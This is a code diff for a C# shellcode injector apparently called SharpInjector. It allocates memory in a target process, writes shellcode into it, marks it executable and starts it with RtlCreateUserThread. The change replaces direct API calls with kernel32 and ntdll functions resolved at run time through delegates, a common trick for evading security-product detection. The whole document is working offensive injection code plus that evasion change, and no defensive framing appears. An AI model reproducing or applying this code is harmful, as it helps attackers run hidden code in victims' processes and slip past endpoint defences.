@@ -63,20 +63,26 @@ namespace SharpInjector
             Process Target = Process.GetProcessById((int)ProcessInfo.dwProcessId);
 
             Console.WriteLine("[*] Allocating shellcode...");
-            IntPtr Address = WinAPI.VirtualAllocEx(Target.Handle, IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
+            IntPtr pVirtualAllocEx = reprobate.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
+            WinAPI.VirtualAllocEx VirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pVirtualAllocEx, typeof(WinAPI.VirtualAllocEx)) as WinAPI.VirtualAllocEx;
+            IntPtr Address = VirtualAllocEx(Target.Handle, IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
             if (Address == IntPtr.Zero)
             {
                 WinAPI.TerminateProcess(ProcessInfo.hProcess, 0);
                 return;
             }
 
-            if (!WinAPI.WriteProcessMemory(ProcessInfo.hProcess, Address, Shellcode, Shellcode.Length, out bytesWritten))
+            IntPtr pWriteProcessMemory = reprobate.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
+            WinAPI.WriteProcessMemory WriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WinAPI.WriteProcessMemory)) as WinAPI.WriteProcessMemory;
+            if (!WriteProcessMemory(ProcessInfo.hProcess, Address, Shellcode, Shellcode.Length, out bytesWritten))
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                 return;
             }
 
-            if (!WinAPI.VirtualProtectEx(ProcessInfo.hProcess, Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
+            IntPtr pVirtualProtectEx = reprobate.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
+            WinAPI.VirtualProtectEx VirtualProtectEx = Marshal.GetDelegateForFunctionPointer(pVirtualProtectEx, typeof(WinAPI.VirtualProtectEx)) as WinAPI.VirtualProtectEx;
+            if (!VirtualProtectEx(ProcessInfo.hProcess, Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
             {
                 WinAPI.Clean(ProcessInfo.hProcess, Address, Shellcode.Length);
                 return;
@@ -86,7 +92,9 @@ namespace SharpInjector
             UInt32 ClientId;
 
             Console.WriteLine("[*] Calling RtlCreateUserThread...");
-            WinAPI.RtlCreateUserThread(ProcessInfo.hProcess, 0, false, 0, 0, 0, Address, 0, IntPtr.Zero, out hThread, out ClientId);
+            IntPtr pRtlCreateUserThread = reprobate.GetLibraryAddress("ntdll.dll", "RtlCreateUserThread");
+            WinAPI.RtlCreateUserThread RtlCreateUserThread = Marshal.GetDelegateForFunctionPointer(pRtlCreateUserThread, typeof(WinAPI.RtlCreateUserThread)) as WinAPI.RtlCreateUserThread;
+            RtlCreateUserThread(ProcessInfo.hProcess, 0, false, 0, 0, 0, Address, 0, IntPtr.Zero, out hThread, out ClientId);
 
             WinAPI.CloseHandle(ParentHandle);
             Console.WriteLine("[*] Shellcode executed");
